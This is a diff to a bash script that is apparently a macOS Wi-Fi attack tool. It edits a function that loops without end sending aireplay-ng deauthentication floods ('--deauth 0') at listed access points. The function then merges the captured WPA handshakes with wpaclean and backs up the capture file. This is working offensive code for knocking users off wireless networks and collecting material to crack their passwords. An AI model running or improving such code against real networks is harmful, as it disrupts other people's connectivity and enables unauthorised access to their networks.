@@ -164,7 +164,7 @@ function _runMac() {
   echo -e "[${BLUE}START${RESET}] Initiating the scan with wifi-scan (MacOS version). Cancel with Command+C."
   echo -e ""
 
-  #_validate "aircrack-ng wpaclean"
+  _validate "aircrack-ng wpaclean"
 
   # Create and always use capture dir.
   mkdir -p $CAPTURE_FOLDER
@@ -210,10 +210,10 @@ function _runMac() {
     while true; do
       for bssid in $bssids; do
         echo -e "${GRAY}[BSSID: $bssid]${RESET} Running deauth "
-        sudo aireplay-ng --deauth 0 -a $bssid $iface
+        sudo aireplay-ng --deauth 0 -a "$bssid" $iface 
         sleep 1
       done
-      sleep 1
+      sleep 10
     done
   )
 
@@ -226,6 +226,7 @@ function _runMac() {
   # Run WPAClean to combine all the result into single nice capture. wpaclean is part of aircrack-ng.
   echo -e "[${BLUE}START${RESET}] Extract useful stuff from the caps into $CAPTURE_FOLDER/wpa.cap"
   wpaclean "$CAPTURE_FOLDER/wpa.cap" /tmp/airportSniff*.cap | tee >(grep "Net" >> $CAPTURE_FOLDER/besside.log)
+  cp $CAPTURE_FOLDER/wpa.cap{,.bak}
 
   # TODO: if it succeeds, then following should run, wpa.cap may not always be there.
   if [[ -e "$CAPTURE_FOLDER/wpa.cap" ]]; then
